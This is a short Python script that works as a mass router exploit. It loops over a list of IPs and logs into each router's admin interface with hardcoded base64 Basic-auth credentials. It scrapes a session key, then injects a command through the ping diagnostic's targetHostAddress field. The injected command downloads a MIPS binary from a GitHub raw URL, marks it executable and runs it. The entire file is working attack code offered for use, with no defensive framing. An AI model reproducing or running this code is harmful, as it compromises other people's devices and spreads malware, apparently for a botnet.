import requests
from subprocess import Popen, PIPE

authorization_header = "YWRtaW46QWRtMW5ATDFtMyM="
lhost = "lo"
lport = 80
payload_port = 81

def main():
    ip_file = open("ips.txt", "r")
    for ip in ip_file:
        router_host = f"http://{ip.strip()}"
        try:
            session_key = get_session(router_host)
            send_payload(router_host, session_key, f"wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; chmod +x mips; ./mips")
            print(f"done for {ip}")
        except:
            print(f"failed for {ip}")
    ip_file.close()

def get_session(router_host):
    url = router_host + "/admin/ping.html"
    headers = {"Authorization": "Basic {}".format(authorization_header)}
    r = requests.get(url, headers=headers).text
    i = r.find("&sessionKey=") + len("&sessionKey=")
    s = ""
    while r[i] != "'":
        s = s + r[i]
        i = i + 1
    return s

def send_payload(router_host, session_key, payload):
    url = router_host + "/admin/pingHost.cmd"
    headers = {"Authorization": "Basic {}".format(authorization_header)}
    params = {"action": "add", "targetHostAddress": payload, "sessionKey": session_key}
    requests.get(url, headers=headers, params=params).text

main()